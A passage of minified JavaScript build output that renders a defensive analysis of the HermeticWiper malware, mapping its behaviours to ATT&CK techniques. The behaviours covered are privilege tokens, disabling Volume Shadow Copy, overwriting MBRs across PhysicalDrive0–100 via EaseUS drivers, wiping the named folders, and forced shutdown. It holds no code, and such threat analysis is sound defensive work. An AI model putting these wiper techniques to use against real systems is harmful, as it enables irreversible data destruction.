Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1106",(0,i.kt)("br",null),"T1134"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Native APIs")," to increase privilege"),(0,i.kt)("td",{parentName:"tr",align:null})))),(0,i.kt)("h4",{id:"notes-5"},"Notes"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"An access token is a type of object that describes the security context of a process or thread, and is assigned to all processes created in the system."),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("em",{parentName:"li"},"SeLoadDriverPrivilege"),": Allows to Load and unload device drivers. The activation of this policy in the context of non-privileged users implies a significant risk due to the possibility of executing code in kernel space."),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("em",{parentName:"li"},"SeShutDownPrivilege"),": Allows to shutdown local system. Ransomware and wipers might rely on this for larger impact."),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("em",{parentName:"li"},"SeBackupPrivilege"),": Allows to read files even when such right is not specified on the Access Control List. Ransomware and wipers might rely on this for larger impact."),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/"},"https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://grzegorztworek.medium.com/ive-got-the-power-4f44b1998c88"},"https://grzegorztworek.medium.com/ive-got-the-power-4f44b1998c88"))),(0,i.kt)("h3",{id:"hermeticwiper-used-native-apis-to-stop-the-volume-shadow-copy-service-for-impact"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"h3"},"Native APIs")," to stop the Volume Shadow Copy Service for Impact."),(0,i.kt)("h4",{id:"tactic-10"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Impact")),(0,i.kt)("h4",{id:"techniques-10"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1106 - Native API"),(0,i.kt)("li",{parentName:"ul"},"T1490 - Inhibit System Recovery")),(0,i.kt)("h4",{id:"behaviors-and-observables-10"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1106",(0,i.kt)("br",null),"T1490"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Native APIs")," to stop VSS service."),(0,i.kt)("td",{parentName:"tr",align:null})))),(0,i.kt)("h4",{id:"notes-6"},"Notes"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"The VSS service creates incremental back-ups over time. It's is often disabled by ransomware and wipers."),(0,i.kt)("li",{parentName:"ul"},"An alternative method is to use ",(0,i.kt)("em",{parentName:"li"},"SC.EXE")," to disable VSS service.")),(0,i.kt)("h3",{id:"hermeticwiper-used-easeus-partition-master-drivers-for-direct-access-to-storage-devices-to-overwrite-files-for-impact"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"h3"},"EaseUS Partition Master")," drivers for direct access to storage devices to overwrite files for Impact."),(0,i.kt)("h4",{id:"tactic-11"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Impact")),(0,i.kt)("h4",{id:"techniques-11"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1561.002 - Disk Structure Wipe"),(0,i.kt)("li",{parentName:"ul"},"T1561.001 - Disk Content Wipe")),(0,i.kt)("h4",{id:"behaviors-and-observables-11"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1561.002"),(0,i.kt)("td",{parentName:"tr",align:null},"Malware iterates from ",(0,i.kt)("em",{parentName:"td"},"PhysicalDrive0")," to ",(0,i.kt)("em",{parentName:"td"},"PhysicalDrive100")," to overwrite ",(0,i.kt)("em",{parentName:"td"},"MBR"),"."),(0,i.kt)("td",{parentName:"tr",align:null})),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1561.001"),(0,i.kt)("td",{parentName:"tr",align:null},"Malware overwrites files under specific folders with random data."),(0,i.kt)("td",{parentName:"tr",align:null})))),(0,i.kt)("h4",{id:"notes-7"},"Notes"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Target folders: C:\\Documents and Settings\\, C:\\System Volume Information\\, C:\\Windows\\SYSVOL\\, C:\\Windows\\System32\\winevt\\Logs, C:\\Windows\\System32\\winevt\\Logs")),(0,i.kt)("h3",{id:"hermeticwiper-used-initiatesystemshutdownex-native-api-to-shutdown-the-system-for-impact"},"HermeticWiper used ",(0,i.kt)("em",{parentName:"h3"},"InitiateSystemShutdownEx")," Native API to shutdown the system for Impact."),(0,i.kt)("h4",{id:"tactic-12"},"Tactic"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Impact")),(0,i.kt)("h4",{id:"techniques-12"},"Techniques"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"T1106 - Native API"),(0,i.kt)("li",{parentName:"ul"},"T1529 - System Shutdown/Reboot")),(0,i.kt)("h4",{id:"behaviors-and-observables-12"},"Behaviors and Observables"),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"T1106",(0,i.kt)("br",null),"T1529"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Native APIs")," to increase privilege"),(0,i.kt)("td",{parentName:"tr",align:null})))),(0,i.kt)("h4",{id:"notes-8"},"Notes"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"This API requires ",(0,i.kt)("em",{parentName:"li"},"SeShutDownPrivilege")," privilege.")))}u.isMDXComponent=!0}}]);